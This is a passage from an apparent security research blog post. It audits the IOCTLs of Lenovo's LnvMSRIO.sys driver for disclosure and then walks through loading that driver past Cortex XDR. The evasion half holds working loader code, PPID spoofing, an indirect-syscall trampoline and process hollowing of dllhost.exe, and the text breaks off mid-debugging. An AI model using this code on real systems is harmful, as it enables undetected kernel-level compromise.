---
title: "LnvMSRIO.sys, the 13 IOCTLs nobody audited, and an eight-round walk past Cortex XDR"
date: 2026-06-05 12:00:00 -0500
categories: [Research, Vulnerable Drivers, EDR Evasion]
tags: [byovd, lenovo, lnvmsrio, cortex-xdr, process-hollowing, indirect-syscalls, shellcode, ntloaddriver, hvci, ioctl-audit, port-io, pci-config]
toc: true
lang: en
description: >-
  CVE-2025-8061 covered one IOCTL of Lenovo's signed `LnvMSRIO.sys`. The
  driver's dispatch table contains eighteen. This is the full audit — every
  IOCTL reversed instruction-level, the five new primitives nobody published
  (8/16/32-bit unprivileged port-I/O R/W, PCI configuration space R/W via the
  CF8/CFC bus, an unprotected kernel `HLT`, and an `rdpmc` info-leak), and the
  eight-round walk past Cortex XDR's `sync.suspicious_driver_service_creation`
  rule family that ended with `NtLoadDriver` returning `STATUS_SUCCESS` from
  inside a hollowed `dllhost.exe` while the EDR stayed silent. Plus the
  defender side — the technique is detectable, just not by the rules deployed
  today.
---

> **TL;DR** — `LnvMSRIO.sys` v3.1.0.36 (Lenovo Process Management / Dispatcher)
> exposes **18 IOCTLs** on its `\\.\WinMsrDev` device. CVE-2025-8061 and the
> public PoCs together cover **four** of them. The other **fourteen** include
> 8/16/32-bit unprivileged port-I/O R/W (`out dx, al/ax/eax` and the
> corresponding `in`), what's structurally PCI configuration space R/W
> (canonical bus/device/function decoding into the CF8/CFC port pair),
> a direct kernel `hlt` invocation, and `rdpmc` exposed to user-mode.
> The binary itself, Authentihash `b74a2e4f…bba0`, **is not in the Microsoft
> HVCI block list** as of the 2026-05-12 build — eight months past the
> original CVE, the v3.1.0.36 sample remains live-loadable on default
> Windows 11. To validate the chain end-to-end I had to walk through
> Cortex XDR's behavioural coverage of driver loading: rounds 1 through 5 of
> ordinary user-mode loaders died one after another against the
> `sync.suspicious_driver_service_creation.{1..4}` rule family; round 6
> (process hollowing of `dllhost.exe` via indirect syscalls) passed Cortex
> but my custom payload PE crashed inside the hollowed target before
> executing a single instruction (that one ate three days of debugging); the
> fix was abandoning the PE format entirely and dropping a 2.7 KB
> position-independent shellcode that did the load itself with direct
> `NtLoadDriver` syscall. Final result: `NtLoadDriver` returns `0x00000000`,
> MSR_LSTAR reads back as a canonical kernel address through the loaded
> driver, Cortex never alerts. Findings A–E filed with Lenovo PSIRT and
> Microsoft MSRC.
{: .prompt-tip }

## The setup

There were two unrelated projects on my desk at the same time. One was a
plan to publish a BYOVD-LSASS-dump walkthrough — the kind of post I had
already drafted around `PDFWKRNL.sys`, where the chain logic (PPL toggle on
self, `NtCreateProcessEx` clone, in-memory MiniDump, XOR-write to disk) is
the interesting half and the BYOVD primitive is the delivery half. The
other was a recon I had been running against Cortex XDR's behavioural
coverage of driver loading — I wanted to know which exact rules trigger on
which exact loader shapes, because the threat-research literature is vague
about it.

The two projects merged the day I realised the `PDFWKRNL.sys` sample was so
publicly attributed that Cortex was blocking the *file copy* by SHA-256
threat intel before any loader logic ran. I needed a different driver. The
criteria were narrow:

1. Signed by a recognisable vendor (so HVCI in its default state lets it
   load).
2. Has a known CVE upstream (so I'm not the one publishing 0-day on a
   driver people are still actively using).
3. **Authentihash not in the current Microsoft HVCI block list** (so it
   actually loads on a default Win11 box).
4. **File SHA-256 not in Cortex XDR's threat intel** (so the static AV gate
   doesn't kill it before behavioural rules can fire).

The driver that ticked all four boxes was Lenovo's `LnvMSRIO.sys` v3.1.0.36 —
the "Process Management / Dispatcher" driver shipped with Lenovo's bloat.
CVE-2025-8061 lives in that exact version. Quarkslab published a two-part
blog on it in October 2025. There are two public PoCs (`symeonp/`
`Lenovo-CVE-2025-8061` and `segura2010/lenovo-dispatcher-poc`). It's signed
by Lenovo, the Authentihash isn't on the MS block list, Cortex doesn't
recognise the SHA-256 — perfect.

Once I started reading the driver's dispatch table, the story changed
shape. The public material covers one IOCTL. The driver has eighteen.
That's the audit half of this post. Then I needed to actually drop and load
it on a Cortex-protected box — that's the evasion half.

Lab: clean Windows 11 Pro 24H2 build **26200**, HVCI enabled by default,
Cortex XDR agent connected to a sandbox tenant. The classifier and rules
on the endpoint are the production defaults at the time of writing.

## Part 1 — The driver

### Acquisition and hashing

I lifted `LnvMSRIO.sys` from `segura2010/lenovo-dispatcher-poc`, which ships
it under `resources/`. The hashes:

```
File           : LnvMSRIO.sys
Size           : 40 432 bytes
SHA256         : 7023f08c9f99076a5fb82a0f661847e2951800f095fca1793a0e6bd9c949b478
SHA1           : f496bc9b6e77fef03f945b48f86b840baf61fe47
MD5            : 517917ff2e5008c791d007cecab5e335
Authentihash   : b74a2e4f0a40748a9dc136cd7eaceecbfe40bba0   (SHA-1)
                 bcc5394705e552d0312592c507b71a6bd921782f82bb5b4acc721d2f056030a5  (SHA-256)
PDB leak       : D:\Work\01.Dispatcher\GitLab\process_management\x64\Release\LnvMSRIO.pdb
Compiled       : 2024-11-21
.text size     : 10 045 bytes  (≈ 32 KB stripped image)
```

Imports — short and revealing:

```
ntoskrnl.exe :: PsSetCreateProcessNotifyRoutineEx
ntoskrnl.exe :: MmMapIoSpace
ntoskrnl.exe :: ProbeForWrite
ntoskrnl.exe :: ProbeForRead
```

The presence of `MmMapIoSpace` + `ProbeForRead`/`ProbeForWrite` is the
fingerprint of the CVE-2025-8061 primitive (physical memory map + R/W with
length checks). Everything else interesting in the binary uses inline
instructions (`in`, `out`, `hlt`, `rdpmc`) without going through an
imported function.

### Block-list status

I pulled the May 2026 HVCI vulnerable-driver block list
(`https://aka.ms/VulnerableDriverBlockList`, build 2026-05-12) and grep'd
the XML for our hashes:

```bash
grep -i 'b74a2e4f0a40748a9dc136cd7eaceecbfe40bba0' DriverPolicy_Enforced.xml   # Authentihash SHA-1
grep -i 'bcc5394705e552d0312592c507b71a6bd921782f82bb5b4acc721d2f056030a5' DriverPolicy_Enforced.xml
grep -i '7023f08c9f99076a5fb82a0f661847e2951800f095fca1793a0e6bd9c949b478' DriverPolicy_Enforced.xml
```

Zero hits in all three. Other Lenovo entries are present (`LDiagIO`,
`LenovoDiagnosticsDriver`, `LHA`, `LV561V64`) but **not** LnvMSRIO. That's
the live HVCI gap I was relying on — eight months after CVE-2025-8061 was
public, the binary still loads on a default Win11 with HVCI enforced.

### Reversing the dispatch table

I wrote an IOCTL enumeration helper in Python (`ioctl_enum.py`) that uses
`pefile` + `capstone` to locate `DispatchDeviceControl`-style code (writes
to `DRIVER_OBJECT.MajorFunction[IRP_MJ_DEVICE_CONTROL]` at offset `+0xE0`),
walks the dispatch chain, and emits per-handler info. For Lenovo's coding
style the heuristic for the assignment site fails (they don't do the
standard `mov [rcx+0xE0], <handler_va>` directly), but the script's fallback
mode — scanning all of `.text` for `cmp r/m32, imm32` where `imm32` looks
IOCTL-shaped — picks up everything.

Output for `LnvMSRIO.sys`:

```
Dispatch handler @ 0x140001600 .. 0x140001750
IOCTL constants found in dispatch (cmp [rsp+0x30], 0xXXXXXXXX pattern):
  0x9c402000  0x9c402004  0x9c402084  0x9c402088
  0x9c40208c  0x9c402090
  0x9c4060c4  0x9c4060cc  0x9c4060d0  0x9c4060d4
  0x9c406104  0x9c406144
  0x9c40a0c8  0x9c40a0d8  0x9c40a0dc  0x9c40a0e0
  0x9c40a108  0x9c40a148
```

Eighteen IOCTL codes — grouped neatly by function-code prefix.

Cross-check against the public material:

```
Public coverage:
  0x9c402084  MSR READ   — symeonp's PoC (LSTAR-hijack technique)
  0x9c402088  MSR WRITE  — symeonp's PoC
  0x9c406104  PHYS READ  — segura2010's PoC (via MmMapIoSpace)
  0x9c40a108  PHYS WRITE — segura2010's PoC, CVE-2025-8061
```

That's four covered out of eighteen. The other fourteen never got audited.

### Per-handler walkthrough

The dispatch handler is a flat `cmp/je` cascade keyed on
`[rsp+0x30]` (the `IoControlCode` field of `IO_STACK_LOCATION` at this
prologue's stack frame). Each `je` target is one of eleven unique
sub-handlers (some IOCTLs share a multi-mode handler that re-dispatches
internally). Tracing the `je` targets and disassembling the thunk + leaf
gives the full primitive matrix:

| # | IOCTL | Handler VA | Leaf VA | Primitive | Status |
|---|---|---|---|---|---|
| 1 | `0x9c402000` | `0x14000175e` | inline | returns const `0x1000000` (version probe) | inline trivia |
| 2 | `0x9c402004` | `0x1400017a0` | inline | returns `.rdata` config dword | inline trivia |
| 3 | `0x9c402084` | `0x1400017e4` | inline | `__rdmsr` (MSR READ) | public PoC |
| 4 | `0x9c402088` | `0x140001823` | inline | `__wrmsr` (MSR WRITE) | public PoC / CVE umbrella |
| 5 | `0x9c40208c` | `0x140001862` | `0x140002270` | `rdpmc` (perf counter read) | **NEW** |
| 6 | `0x9c402090` | `0x1400018a1` | inline | `hlt` (CPU halt) | **NEW** |
| 7 | `0x9c4060c4` | `0x1400018af` (default) | `0x140001fb1` | error path | n/a |
| 8 | `0x9c4060cc` | `0x1400018af` | `0x140001e20` | `in al, dx` (port READ 8-bit) | **NEW** |
| 9 | `0x9c4060d0` | `0x1400018af` | `0x140001e60` | `in ax, dx` (port READ 16-bit) | **NEW** |
| 10 | `0x9c4060d4` | `0x1400018af` | `0x140001e40` | `in eax, dx` (port READ 32-bit) | **NEW** |
| 11 | `0x9c406104` | `0x1400019c0` | `0x140001fe0` | phys-mem READ via `MmMapIoSpace` | public PoC |
| 12 | `0x9c406144` | `0x140001945` | `0x140002790` | bit-fielded READ (PCI BDF-shaped) | **NEW** |
| 13 | `0x9c40a0c8` | `0x1400018fa` (default) | `0x1400024ea` | error path | n/a |
| 14 | `0x9c40a0d8` | `0x1400018fa` | `0x140002380` | `out dx, al` (port WRITE 8-bit) | **NEW** |
| 15 | `0x9c40a0dc` | `0x1400018fa` | `0x1400023c0` | `out dx, ax` (port WRITE 16-bit) | **NEW** |
| 16 | `0x9c40a0e0` | `0x1400018fa` | `0x1400023a0` | `out dx, eax` (port WRITE 32-bit) | **NEW** |
| 17 | `0x9c40a108` | `0x1400019fc` | `0x140002500` | phys-mem WRITE via `MmMapIoSpace` | **CVE-2025-8061** |
| 18 | `0x9c40a148` | `0x140001984` | `0x140002880` | bit-fielded WRITE (PCI BDF-shaped) | **NEW** |

### The new primitives, instruction-level

**Port-I/O READ leaves** are tiny. Handler for `0x9c4060d4` (32-bit read)
calls leaf `0x140001e40`:

```
0x140001e40:  mov   rcx, [rsp+8]
0x140001e45:  sub   rsp, 0x18
0x140001e49:  movzx edx, WORD PTR [rsp+0x20]   ; port = user input[0:2]
0x140001e4e:  in    eax, dx                     ; <-- the primitive
0x140001e4f:  mov   [rsp], eax
0x140001e52:  mov   eax, [rsp]
0x140001e55:  add   rsp, 0x18
0x140001e59:  ret
```

Six lines. The 8-bit variant ends in `in al, dx` at `0x140001e2e`, the
16-bit in `in ax, dx` at `0x140001e6e`. No port allow-list, no IRQL check,
no `ProbeForRead` on the user buffer that holds the port number.

**Port-I/O WRITE leaves** mirror the reads:

```
0x1400023a0:  mov   [rsp+0x10], edx              ; value to write
0x1400023a4:  mov   [rsp+0x8],  rcx
0x1400023a9:  movzx edx, WORD PTR [rsp+0x8]      ; port = user input[0:2]
0x1400023ae:  mov   eax, [rsp+0x10]
0x1400023b2:  out   dx, eax                       ; <-- the primitive
0x1400023b3:  ret
```

`out dx, al` at `0x140002393` (8-bit), `out dx, ax` at `0x1400023d4`
(16-bit), `out dx, eax` at `0x1400023b2` (32-bit). Take a 16-bit port and a
32-bit value from user-mode admin, execute `out` at ring 0.

That's the bug class. Anything you can think of that's accessible via
legacy port I/O is now writable from a user-mode admin process holding an
open handle on `\\.\WinMsrDev`. The list of practical consequences off the
top of my head:

| Port | Effect |
|---|---|
| `0xCF9` bit 2 = 1 | Hard PCI reset (instant reboot, no shutdown coordination) |
| ACPI `PMx_CNT` (`0x1804`/varies) | Force S5 / hibernate |
| `0x64` ← `0xFE` | Keyboard controller "CPU reset" command |
| `0x66` / `0x62` | EC commands on laptops — firmware-level controller |
| `0xCF8` / `0xCFC` | Legacy PCI config R/W → reconfigure any PCI device |

The `HLT` primitive is simpler still:

```
0x1400018a1:  hlt                          ; <-- the primitive
0x1400018a2:  mov   DWORD PTR [rsp+0x34], 0   ; status = STATUS_SUCCESS
```

That's the entire handler for IOCTL `0x9c402090`. Issue the IOCTL, kernel
mode executes `hlt`, CPU halts until next interrupt. At PASSIVE_LEVEL with
interrupts enabled it's a "pause your CPU for a millisecond" instruction;
not catastrophic on its own, not something a user-mode IOCTL should be able
to reach.

The `rdpmc` handler:

```
0x1400022a3:  mov   ecx, [rax]              ; counter index from user
0x1400022a5:  rdpmc                          ; <-- read perf counter
0x1400022a7:  shl   rdx, 0x20
0x1400022ab:  or    rax, rdx
0x1400022ae:  mov   QWORD PTR [rsp+0x20], rax
```

User supplies a counter index, kernel-mode `rdpmc` runs, the 8-byte result
goes back. The intended use was probably diagnostics; the side effect is an
unprivileged side-channel / timing oracle.

### The PCI-shaped IOCTLs

Both leaves at `0x140002790` (READ, IOCTL `0x9c406144`) and `0x140002880`
(WRITE, IOCTL `0x9c40a148`) decode the user's 32-bit input parameter the
same way:

```
shr eax, 8  ; and eax, 0xFF      ; bus      (8 bits)
shr eax, 3  ; and eax, 0x1F      ; device   (5 bits)
                                  ; function (3 bits in bottom)
```

That's textbook PCI bus/device/function encoding from a single 32-bit
identifier — the same field layout you'd write into the `0xCF8` address
register before reading or writing the corresponding 32-bit word at
`0xCFC`. The handlers do further bit manipulation around the offset field
before calling deeper, and I haven't dynamically traced the call to
confirm whether they go through `HalGetBusDataByOffset` /
`HalSetBusDataByOffset` (the documented PCI legacy access) or do raw
`0xCF8`/`0xCFC` port poking internally. Either way, the surface is the
same: arbitrary PCI configuration R/W from user-mode admin, which is the
standard "reconfigure any PCI device" attack surface (BAR remapping, MSI
redirection, command-register tweaks).

I'm filing these as findings with the runtime-confirmation step pending.
The static signal is strong enough to report and ask Lenovo to look.

### Findings filed with Lenovo PSIRT

Severities estimated honestly (not inflated):

| # | Finding | CVSS est. | Confidence |
|---|---|---|---|
| A | Unprivileged 8/16/32-bit port-I/O **WRITE** (`0x9c40a0d8/dc/e0`) | 7.8 HIGH | Static-confirmed |
| B | Unprivileged 8/16/32-bit port-I/O **READ** (`0x9c4060cc/d0/d4`) | 5.5 MEDIUM | Static-confirmed |
| C | PCI configuration R/W (`0x9c406144` + `0x9c40a148`) | 7.1 HIGH | Static, runtime pending |
| D | Kernel `HLT` invocation (`0x9c402090`) | 3.3 LOW | Static-confirmed |
| E | `RDPMC` exposure (`0x9c40208c`) | 3.3 LOW | Static-confirmed |

Reporter: trexnegr0 (independent kernel-driver researcher). Disclosure
horizon: 90 days from PSIRT acknowledgement. Microsoft MSRC submission
filed in parallel asking for HVCI block-list addition of v3.1.0.36's
Authentihash given the existing CVE-2025-8061 status + the additional
findings above + the fact that no version of the binary covered by that
Authentihash is on the published block list as of 2026-05-12.

## Part 2 — Loading the driver past Cortex XDR

Now I had a driver worth loading and a set of static findings worth
producing runtime evidence for. The question was: how does Cortex XDR see
a BYOVD chain that drops and loads this binary?

The answer turned out to involve a rule family called
`sync.suspicious_driver_service_creation` with at least four numbered
variants, each catching a different shape of "userland process is about to
make a kernel driver load happen". I walked into each of them in turn.

### Round 1 — `sc.exe` from PowerShell

The most textbook flow there is:

```powershell
sc.exe create WinMsr type= kernel binPath= C:\Tools\LnvMSRIO.sys
sc.exe start  WinMsr
```

Cortex prevention dialog:

```
Componente: Análisis dinámico
Código de Cortex XDR: c0400067
Descripción de la prevención: Comportamiento malicioso detectado
Información adicional 1: Rule sync.suspicious_driver_service_creation.1
```

Killed during `sc create`. Whole PowerShell process terminated. Rule `.1`
watches the SCM API path (`OpenSCManager` + `CreateServiceW` +
`StartService`) correlated with a non-trusted parent process. What it
doesn't watch is the file copy — `LnvMSRIO.sys` sat on `C:\Tools\` happily.
That tells me the SHA-256 isn't in Cortex's TI yet (good signal — useful
for the rest of the post) and that the rule fires on behaviour, not on
file features.

### Round 2 — `NtLoadDriver` direct, bypassing the SCM

If Cortex is watching the SCM API path, the obvious move is to call
`NtLoadDriver` directly — that's the actual syscall the SCM ends up making
internally. We need to write the driver's service registry key by hand
first, then issue the syscall.

```c
#include <windows.h>
#include <stdio.h>

#define SVC_REG_PATH L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\WinMsr"

typedef LONG NTSTATUS;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef VOID    (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI *NtLoadDriver_t)(PUNICODE_STRING);

static int enable_priv(LPCWSTR p) {
    HANDLE t;
    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t);
    LUID l; LookupPrivilegeValueW(NULL, p, &l);
    TOKEN_PRIVILEGES tp = { 1, { { l, SE_PRIVILEGE_ENABLED } } };
    AdjustTokenPrivileges(t, FALSE, &tp, sizeof tp, NULL, NULL);
    return GetLastError();
}

static int write_svc_reg(const wchar_t *abs_path) {
    HKEY k;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinMsr",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &k, NULL);

    wchar_t ip[512];
    swprintf_s(ip, 512, L"\\??\\%ls", abs_path);
    DWORD ty=1, st=3, ec=1;
    RegSetValueExW(k, L"ImagePath", 0, REG_EXPAND_SZ,
        (BYTE*)ip, (DWORD)((wcslen(ip)+1)*sizeof(wchar_t)));
    RegSetValueExW(k, L"Type",         0, REG_DWORD, (BYTE*)&ty, sizeof ty);
    RegSetValueExW(k, L"Start",        0, REG_DWORD, (BYTE*)&st, sizeof st);
    RegSetValueExW(k, L"ErrorControl", 0, REG_DWORD, (BYTE*)&ec, sizeof ec);
    RegCloseKey(k);
    return 0;
}

int wmain(int argc, wchar_t **argv) {
    enable_priv(L"SeLoadDriverPrivilege");
    write_svc_reg(argv[2]);

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    RtlInitUnicodeString_t pRtlInit = (RtlInitUnicodeString_t)
        GetProcAddress(nt, "RtlInitUnicodeString");
    NtLoadDriver_t pLoad = (NtLoadDriver_t)
        GetProcAddress(nt, "NtLoadDriver");

    UNICODE_STRING us;
    pRtlInit(&us, SVC_REG_PATH);
    NTSTATUS st = pLoad(&us);
    printf("NtLoadDriver -> 0x%08lx\n", st);
    return st < 0 ? 1 : 0;
}
```

Compile, run from PowerShell:

```
Rule sync.suspicious_driver_service_creation.4
```

Different variant of the same rule family. Killed before the `NtLoadDriver`
syscall fires. Cortex is correlating the parent (`pwsh`) with what the
child is about to do, presumably via kernel callbacks (`PsSetCreate`
`ProcessNotifyRoutineEx` registered by `cyverak.sys`) and ETW telemetry.
The loader binary itself wasn't on the hash-block list (the file was
created on disk, the process ran briefly before the kill). So this is
behavioural classification on lineage + intent, not threat intel.

### Round 3 — PPID spoof to break the lineage

Standard trick when an EDR rule cares about parent-process identity is to
spoof it. On x64 Windows you spawn a child with
`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` pointing at `services.exe` or
`TrustedInstaller.exe`, and the user-mode view of the lineage shows that
process as the parent rather than `pwsh.exe`.

```c
static BOOL spawn_with_ppid(const wchar_t *exe, wchar_t *cmd,
                            const wchar_t *parent_name) {
    DWORD ppid = find_pid_by_name(parent_name);  /* toolhelp32 walk */
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrs = HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(attrs, 1, 0, &attrSize);
    UpdateProcThreadAttribute(attrs, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof hParent, NULL, NULL);

    STARTUPINFOEXW si = { 0 };
    si.StartupInfo.cb = sizeof si;
    si.lpAttributeList = attrs;
    PROCESS_INFORMATION pi = { 0 };

    BOOL ok = CreateProcessW(exe, cmd, NULL, NULL, FALSE,
                             EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                             NULL, NULL,
                             (LPSTARTUPINFOW)&si, &pi);
    /* ... */
    return ok;
}
```

The loader detects its real parent is `pwsh` on first run, re-spawns
itself with `services.exe` as parent, the first instance exits, the second
instance with the spoofed parent does the registry write +
`NtLoadDriver`.

```
Rule sync.suspicious_driver_service_creation.4
```

Same rule. Cortex's kernel callback sees the *real* creating PID
independent of the user-mode parent spoof — `PROC_THREAD_ATTRIBUTE_`
`PARENT_PROCESS` is interpreted by `PspCreateProcess` kernel code, but the
process-create notify routine registered by `cyverak.sys` is given the
*actual* `CreatingThreadId` / `ParentProcessId` from the kernel, not the
spoofed PPID. PPID spoofing is useful against userland-only ETW consumers
and useless against kernel-callback-based rules.

### Round 4 — full bypass kit + indirect syscalls

I have an in-house bypass kit. Its primitives are:

- **HW-BP AMSI bypass** (`Dr0` → `amsi!AmsiScanBuffer`, VEH rewrites the
  result pointer to `AMSI_RESULT_CLEAN` without writing a single byte to
  `amsi.dll`).
- **HW-BP ETW silence** (`Dr1` → `ntdll!EtwEventWrite`).
- **TartarusGate indirect syscalls** — SSN recovered at runtime by walking
  `ntdll!Nt*` stubs and reading the canonical `mov eax, ssn` constant; the
  `syscall` instruction is jumped to inside ntdll so the call-stack ETW
  shows ntdll as origin.
- **Selective `ntdll` unhook** — restore the specific function's bytes from
  `\KnownDlls\ntdll.dll` if any inline hook is present.

I layered all of that on top of round 3's PPID-spoofed loader:

```c
bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);

sc_entry_t entry = { 0 };
sc_resolve(bp_fnv1a("NtLoadDriver"), &entry);
sc_dispatch(&entry, (DWORD64)&us, 0, 0, 0, 0, 0, 0, 0);
```

The indirect-syscall trampoline (x86-64 NASM-ish, intel syntax):

```asm
sc_trampoline:
    mov     r11, rcx                 ; save syscall_addr
    mov     eax, edx                 ; SSN -> eax
    mov     rcx, r8                  ; shift args left
    mov     rdx, r9
    mov     r8,  [rsp+0x28]
    mov     r9,  [rsp+0x30]
    mov     r10, [rsp+0x38]          ; arg5 from caller
    mov     [rsp+0x28], r10          ; rewrite stack so syscall sees args correctly
    /* ... shift remaining stack args ... */
    mov     r10, rcx                 ; Windows syscall conv: r10 = rcx
    jmp     r11                      ; jump into ntdll at a real `syscall; ret`
```

The `jmp r11` lands inside `ntdll.dll`'s `.text` on a `syscall; ret`
sequence. The stack walk ETW provider sees the call originating from
`ntdll!Nt*`, not from our binary, even though the SSN was sourced and
dispatched from us.

```
Rule sync.suspicious_driver_service_creation.4
```

Same rule. And here the kill timing said something different — **Cortex
was killing the loader at `ProcessCreate`, before our code executed a
single instruction**. The indirect syscalls never installed. The ETW HWBP
never armed. None of the bypass primitives matter when the rule classifies
your binary as a driver-loader-shaped binary at process create time, based
on the PE's static features: `advapi32.dll` imports, the literal string
`\Registry\Machine\System\CurrentControlSet\Services\WinMsr` in `.rdata`,
the imported `RegSetValueExW` slot. The combination is enough for the
classifier to decide and kill on sight.

That's a level of behavioural coverage I wasn't expecting at process-create
time. It's not threat intel (no specific hash on a list, the file ran
briefly enough to drop a kernel-driver `.sys` to disk untouched), it's not
behavioural execution monitoring (we never got to execute), it's
**predictive classification at process create**. Nice rule. Frustrating to
walk into.

### Round 5 — pivot: process hollowing of `dllhost.exe`

If the rule is on the binary's static features and lineage, the answer is
to make sure the caller of `NtLoadDriver` is a Microsoft-signed binary
that Cortex doesn't classify as a driver loader at process create.

`dllhost.exe` is signed by Microsoft, lives in `C:\Windows\System32\`, runs
constantly, and is exactly the kind of process to live inside. Process
hollowing is the standard technique: spawn dllhost suspended, unmap its
image, write your payload at its preferred image base, patch the PEB, set
the thread context's entry pointer, resume.

The whole hollow has to be done via indirect syscalls so the
`NtUnmapViewOfSection` / `NtWriteVirtualMemory` / `NtSetContextThread`
chain doesn't trip any userland ETW consumer. The kit primitive:

```c
int bp_hollow_and_run(const char *target_exe,
                       const void *payload, size_t payload_len,
                       const wchar_t *payload_cmdline,
                       DWORD wait_ms,
                       DWORD *out_pid) {
    /* 1. CreateProcess(target, CREATE_SUSPENDED) */
    CreateProcessA(target_exe, target_cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);

    /* 2. Resolve target's PEB → ImageBase */
    pNtQueryInformationProcess(hProc, 0, &pbi, sizeof pbi, NULL);

    /* 3. Unmap the original image */
    pNtUnmapViewOfSection(hProc, pbi.PebBaseAddress->ImageBaseAddress);

    /* 4. Allocate the payload's preferred ImageBase */
    remote_base = VirtualAllocEx(hProc, payload_pref_base, payload_image_sz,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    /* 5. Layout payload headers + sections, apply relocations if delta != 0 */
    memcpy(local_image, payload, payload_hdr_sz);
    for each section: memcpy(local_image + sec[i].VirtualAddress, ...);
    apply_relocations(local_image, local_nt, delta);

    /* 6. NtWriteVirtualMemory full image */
    pNtWriteVirtualMemory(hProc, remote_base, local_image,
                          payload_image_sz, &wr);

    /* 7. Per-section page protections (avoid blanket RWX) */
    for each section: VirtualProtectEx(hProc, remote_base + va, size, prot);

    /* 8. Patch PEB.ImageBaseAddress and ProcessParameters.CommandLine */
    pNtWriteVirtualMemory(hProc, &peb->ImageBaseAddress,
                          &remote_base, sizeof PVOID, &wr);
    /* CommandLine patching via ProcessParameters at +0x70 */

    /* 9. SetThreadContext: Rcx = entry */
    GetThreadContext(hThread, &ctx);
    ctx.Rcx = (DWORD64)remote_base + payload_entry_rva;
    SetThreadContext(hThread, &ctx);

    /* 10. Resume */
    ResumeThread(hThread);
}
```

Built a custom PE payload that does the registry write + `NtLoadDriver`
from inside the hollowed dllhost, embedded the payload bytes inside the
dropper's `.rdata`, ran it:

```
[hollow] CreateProcess SUSPENDED target=C:\Windows\System32\dllhost.exe
[hollow]   target PID = 28692
[hollow] NtUnmapViewOfSection(target_image)
[hollow] VirtualAllocEx at preferred base 0000000140000000 (size 77824)
[hollow] NtWriteVirtualMemory full image (77824 bytes)
[hollow] Patching target PEB
[hollow] SetThreadContext entry=0000000140002ea0
[hollow] ResumeThread
[hollow] [+] hollowed and resumed
[hollow]   target exit code = 3221225477   ← 0xC0000005, STATUS_ACCESS_VIOLATION
```

**No Cortex alert.** None. The hollow ran clean through indirect syscalls,
the payload was written into the remote, the thread resumed. And then the
payload crashed with an access violation inside dllhost before producing
any output. The Cortex side worked. The loader side was broken.

### Round 6 — the rabbit hole

The AV happens before the payload's `wmain` writes its first marker file.
I assumed: IAT not resolved. The OS loader normally walks
`IMAGE_DIRECTORY_ENTRY_IMPORT` of the booting PE, calls `LoadLibraryA` and
`GetProcAddress` for each entry, and patches the payload's IAT slots. In
process hollowing, no OS loader runs for the payload — its IAT is full of
RVAs from the file, not resolved virtual addresses.

So I wrote a manual IAT resolver as a custom entry stub. Compiled with
`-nostartfiles -Wl,-e_entry_stub`. The stub does PEB walking to find
kernel32, exports walking to find `LoadLibraryA` and `GetProcAddress`,
iterates the payload's import descriptor, and patches each `FirstThunk`
slot. Then it parses the command line from
`PEB.ProcessParameters.CommandLine` and calls the real `wmain`.

```c
/* PEB walk via gs:[0x60], then walk InMemoryOrderModuleList */
typedef struct _PEB_MIN {
    BYTE Reserved1[2];      // 0x00
    BYTE BeingDebugged;     // 0x02
    BYTE Reserved2[1];      // 0x03
    PVOID ImageBaseAddress; // C puts this at +0x08 with auto-padding   ← BUG
    PEB_LDR *Ldr;           // C puts this at +0x10                     ← BUG
} PEB_MIN;
```

Same AV. So I went down struct-alignment debug — the real offsets on x64
are `ImageBaseAddress` at `+0x10` and `Ldr` at `+0x18`, and I had them at
`+0x08` and `+0x10` because C pad rules align `PVOID` after the four
trailing bytes to `+0x08`. Fixed with explicit padding:

```c
typedef struct _PEB_MIN {
    BYTE  InheritedAddressSpace;     // 0x00
    BYTE  ReadImageFileExecOptions;  // 0x01
    BYTE  BeingDebugged;             // 0x02
    BYTE  BitField;                  // 0x03
    BYTE  Padding0[4];               // 0x04 -- explicit padding
    HANDLE Mutant;                   // 0x08 -- real field, not padding
    PVOID  ImageBaseAddress;         // 0x10
    PEB_LDR *Ldr;                    // 0x18
} PEB_MIN;
```

Same AV. The struct fix was real but it wasn't the bug.

I went deeper. Made the payload trivial — its entire `_entry_stub` body
became:

```c
void _entry_stub(void) {
    __asm__("int $3");      /* breakpoint -> STATUS_BREAKPOINT 0x80000003 */
}
```

If that runs, exit code is `0x80000003`. If it doesn't, exit code stays
`0xC0000005`. Result: `0xC0000005`. The entry point was never reached. The
custom entry stub plus the IAT resolver plus the PEB struct fix had all
been fixes to a non-problem. The thread crashed somewhere between
`ResumeThread` and the first instruction of the payload.

I added forensic logging to the hollow's `SetThreadContext` stage to dump
the suspended thread's initial `Rip`, `Rcx`, and `Rsp`:

```
[hollow]   initial Rip=0x7ffd616a7bf0  Rcx=0x7ff7ce651530  Rsp=0xaa435efd58
```

`Rip` was inside ntdll, in `LdrInitializeThunk`. `Rcx` pointed inside the
original dllhost's image at its entry point (`dllhost!ImageBase +
0x1530`) — the kernel uses the convention "thread starts at
LdrInitializeThunk, with the eventual entry target in Rcx for later use."
The kit was setting `ctx.Rcx = our_entry`, relying on that convention.

But by the time `LdrInitializeThunk` ran, the thread was navigating
infrastructure that assumed the PE in `PEB.ImageBaseAddress` was a sane
PE — and our manually-hollowed payload had subtle inconsistencies the OS
